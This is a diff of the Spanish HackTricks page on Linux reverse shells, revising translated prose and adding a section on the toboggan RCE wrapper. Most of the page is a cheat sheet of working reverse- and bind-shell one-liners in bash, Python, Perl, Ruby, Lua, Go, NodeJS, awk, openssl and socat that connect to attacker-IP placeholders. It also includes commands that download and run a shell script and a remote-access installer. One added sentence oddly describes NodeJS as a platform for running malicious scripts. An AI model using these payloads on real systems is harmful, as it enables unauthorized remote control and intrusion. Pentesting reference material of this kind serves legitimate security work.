@@ -14,11 +14,11 @@ Otras formas de apoyar a HackTricks:
 
 </details>
 
-**Si tienes preguntas sobre cualquiera de estas shells puedes consultarlas en** [**https://explainshell.com/**](https://explainshell.com)
+**Si tienes preguntas sobre cualquiera de estos shells puedes verificarlos con** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**Una vez que obtengas una shell inversa**[ **lee esta página para obtener un TTY completo**](full-ttys.md)**.**
+**Una vez que obtengas un shell inverso**[ **lee esta página para obtener un TTY completo**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -48,8 +48,8 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: Esta parte del comando inicia un shell Bash interactivo (`-i`).
 2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) como el **error estándar** (`stderr`) al **mismo destino**.
-3. **`/dev/tcp/<DIRECCIÓN-IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
-* Al **redirigir las corrientes de salida y error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
+3. **`/dev/tcp/<IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
+* Al **redirigir los flujos de salida y error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
 4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.
 
 ### Crear en archivo y ejecutar
@@ -57,17 +57,49 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Shell Directo
+## Shell Inverso
 
-Si te encuentras con una **vulnerabilidad de RCE** dentro de una aplicación web basada en Linux, puede haber casos en los que **obtener un shell inverso se vuelva difícil** debido a la presencia de reglas de Iptables u otros filtros. En tales escenarios, considera crear un shell PTY dentro del sistema comprometido usando tuberías.
+Cuando se trata de una vulnerabilidad de **Ejecución de Código Remoto (RCE)** en una aplicación web basada en Linux, lograr un shell inverso puede ser obstaculizado por defensas de red como reglas de iptables o mecanismos de filtrado de paquetes intrincados. En entornos tan restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
 
-Puedes encontrar el código en [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
+Una herramienta recomendada para este propósito es [toboggan](https://github.com/n3rada/toboggan.git), que simplifica la interacción con el entorno objetivo.
+
+Para utilizar toboggan de manera efectiva, crea un módulo de Python adaptado al contexto de RCE de tu sistema objetivo. Por ejemplo, un módulo llamado `nix.py` podría estar estructurado de la siguiente manera:
+```python3
+import jwt
+import httpx
+
+def execute(command: str, timeout: float = None) -> str:
+# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+token = jwt.encode(
+{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+)
+
+response = httpx.get(
+url="https://vulnerable.io:3200",
+headers={"Authorization": f"Bearer {token}"},
+timeout=timeout,
+# ||BURP||
+verify=False,
+)
+
+# Check if the request was successful
+response.raise_for_status()
+
+return response.text
+```
+Y luego, puedes ejecutar:
+```shell
+toboggan -m nix.py -i
+```
+Para aprovechar directamente una shell interactiva, puedes agregar `-b` para integración con Burpsuite y eliminar `-i` para un envoltorio rce más básico.
+
+Otra posibilidad consiste en utilizar la implementación de shell avanzada de `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Solo necesitas modificar:
 
-* La URL del host vulnerable
-* El prefijo y sufijo de tu carga útil (si los hay)
-* La forma en que se envía la carga útil (¿encabezados? ¿datos? ¿información adicional?)
+- La URL del host vulnerable
+- El prefijo y sufijo de tu carga útil (si es necesario)
+- La forma en que se envía la carga útil (¿encabezados? ¿datos? ¿información adicional?)
 
 Luego, simplemente puedes **enviar comandos** o incluso **usar el comando `upgrade`** para obtener un PTY completo (ten en cuenta que las tuberías se leen y escriben con un retraso aproximado de 1.3 segundos).
 
@@ -87,7 +119,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet es un protocolo de red que permite la comunicación bidireccional a través de terminales virtuales. Es comúnmente utilizado para acceder y administrar dispositivos de red de forma remota.
+Telnet es un protocolo de red que permite la comunicación bidireccional a través de una terminal virtual. Es comúnmente utilizado para acceder y administrar dispositivos de red de forma remota.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -107,8 +139,6 @@ Para enviar el comando, escríbalo, presione enter y luego presione CTRL+D (para
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
 ## Python
-
-Python es un lenguaje de programación de alto nivel ampliamente utilizado en el hacking ético debido a su facilidad de uso y versatilidad. Es una excelente opción para escribir scripts y herramientas de hacking debido a su sintaxis clara y legible.
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -118,14 +148,14 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl es un lenguaje de programación versátil y potente que se puede utilizar para escribir scripts de shell en sistemas Linux. Ofrece una amplia gama de funciones y módulos que facilitan la manipulación de archivos, el procesamiento de texto y la automatización de tareas. Los scripts de Perl suelen tener una extensión de archivo `.pl` y se pueden ejecutar en la línea de comandos utilizando el intérprete de Perl.
+Perl es un lenguaje de programación versátil y potente que se puede utilizar para escribir scripts de shell en sistemas Linux. Es especialmente útil para tareas de administración del sistema y manipulación de archivos.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby es un lenguaje de programación dinámico y de código abierto conocido por su simplicidad y productividad. Es ampliamente utilizado en el desarrollo web y es compatible con varias plataformas.
+Ruby es un lenguaje de programación dinámico y de código abierto conocido por su simplicidad y productividad. Es ampliamente utilizado en el desarrollo web y en la creación de scripts.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -149,49 +179,17 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 ```
 ## Ncat
-
-Ncat (anteriormente conocido como Netcat) es una herramienta de red que admite una amplia gama de funcionalidades, como lectura y escritura desde archivos, redirección de puertos y escaneo de puertos. Es una herramienta muy versátil que puede ser utilizada para crear conexiones de red directas entre sistemas y realizar pruebas de conectividad.
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
-
-### Introducción
-
-Go, también conocido como Golang, es un lenguaje de programación de código abierto desarrollado por Google. Es conocido por su eficiencia y su capacidad para manejar concurrencia. En este capítulo, exploraremos cómo utilizar Go para crear shells en sistemas Linux.
-
-### Creando una Shell en Linux con Golang
-
-Para crear una shell en Linux utilizando Golang, primero necesitamos importar el paquete `os/exec`, que nos permitirá ejecutar comandos en el sistema operativo. Luego, podemos usar la función `Command` para ejecutar comandos en la shell y capturar su salida.
-
-```go
-package main
-
-import (
-	"os/exec"
-	"fmt"
-)
-
-func main() {
-	cmd := exec.Command("/bin/bash", "-c", "ls -la")
-	out, err := cmd.Output()
-	if err != nil {
-		fmt.Println(err)
-	}
-	fmt.Println(string(out))
-}
-```
-
-En este ejemplo, estamos ejecutando el comando `ls -la` en la shell y capturando su salida. Podemos compilar y ejecutar este programa en un sistema Linux para ver la lista de archivos y directorios en el directorio actual.
-
-### Conclusiones
-
-Go es un lenguaje de programación poderoso que se puede utilizar para crear shells en sistemas Linux de forma eficiente. Con la capacidad de manejar concurrencia y ejecutar comandos en el sistema operativo, Go es una excelente opción para desarrollar herramientas de hacking y pentesting.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
+
+Lua es un lenguaje de programación poderoso, eficiente y ligero. Es ampliamente utilizado en la creación de scripts y en el desarrollo de aplicaciones. Lua es conocido por ser fácil de integrar con otros lenguajes y por su flexibilidad.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -199,6 +197,8 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 ## NodeJS
+
+NodeJS es una plataforma de tiempo de ejecución de JavaScript de código abierto que se utiliza para ejecutar código del lado del servidor. Permite a los hackers ejecutar scripts maliciosos en un servidor comprometido.
 ```javascript
 (function(){
 var net = require("net"),
@@ -249,7 +249,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-La Víctima
+El Objetivo
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -273,7 +273,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk es un lenguaje de programación versátil y poderoso utilizado comúnmente para el procesamiento de texto y la extracción de datos en sistemas Unix y Linux. Permite a los hackers y administradores de sistemas realizar tareas como buscar y reemplazar patrones de texto, filtrar y formatear datos, y realizar cálculos matemáticos simples. Awk se puede utilizar en la línea de comandos o en scripts para automatizar tareas y manipular archivos de texto de manera eficiente.
+Awk es un lenguaje de programación versátil y poderoso utilizado comúnmente para el procesamiento de texto y la extracción de datos. Puede ser utilizado en la línea de comandos de Linux para realizar diversas tareas, como buscar y reemplazar texto, filtrar y formatear datos, y mucho más. Awk es especialmente útil para manipular archivos de texto de forma eficiente y rápida.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -283,7 +283,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Para enviar el comando, escríbalo, presione enter y luego presione CTRL+D (para detener STDIN)
+Para enviar el comando escríbelo, presiona enter y luego presiona CTRL+D (para detener STDIN)
 
 **Victim**
 ```bash
@@ -293,7 +293,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk es una versión mejorada de AWK que se utiliza comúnmente en sistemas Linux. Puede ser utilizado para procesar y extraer información de archivos de texto de una manera eficiente.
+Gawk es una herramienta de procesamiento de texto muy poderosa que se puede utilizar para manipular y transformar datos en archivos de texto. Es especialmente útil para extraer información específica de archivos de registro o de salida de otros comandos.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -347,11 +347,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
